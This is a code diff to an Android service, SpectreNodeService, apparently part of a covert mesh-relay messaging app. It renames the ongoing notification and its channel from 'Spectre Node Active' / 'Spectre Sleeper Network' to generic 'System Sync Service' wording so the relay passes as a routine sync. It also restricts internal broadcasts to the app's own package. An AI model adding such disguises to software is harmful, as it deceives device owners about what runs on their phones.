@@ -86,18 +86,17 @@ class SpectreNodeService : Service() {
 
     private fun buildNotification(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Spectre Node Active 🕷️")
-            .setContentText("Silent Multi-Hop Routing Enabled")
-            .setSmallIcon(android.R.drawable.ic_lock_lock)
+            .setContentTitle("Sync Service")
+            .setContentText("Background synchronization active")
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setOngoing(true)
-            .setColor(0xFF1744.toInt()) // Red
             .build()
     }
 
     private fun createNotificationChannel() {
         val channel = NotificationChannel(
             CHANNEL_ID,
-            "Spectre Sleeper Network",
+            "System Sync Service",
             NotificationManager.IMPORTANCE_LOW
         )
         val manager = getSystemService(NotificationManager::class.java)
@@ -156,6 +155,7 @@ class SpectreNodeService : Service() {
 
     private fun updateStatus(status: String) {
         val uiIntent = Intent(BROADCAST_SPECTRE_STATUS)
+        uiIntent.setPackage(packageName)
         uiIntent.putExtra("status", status)
         sendBroadcast(uiIntent)
     }
@@ -221,8 +221,9 @@ class SpectreNodeService : Service() {
 
                 // Display only if targeted to me or broadcast
                 if (targetId == "ALL" || targetId.equals(myAlias, ignoreCase = true)) {
-                    // Send to local UI
+                    // Send to local UI securely via explicit package intent
                     val uiIntent = Intent(BROADCAST_SPECTRE_MESSAGE)
+                    uiIntent.setPackage(packageName)
                     uiIntent.putExtra("alias", alias)
                     uiIntent.putExtra("message", msg)
                     sendBroadcast(uiIntent)
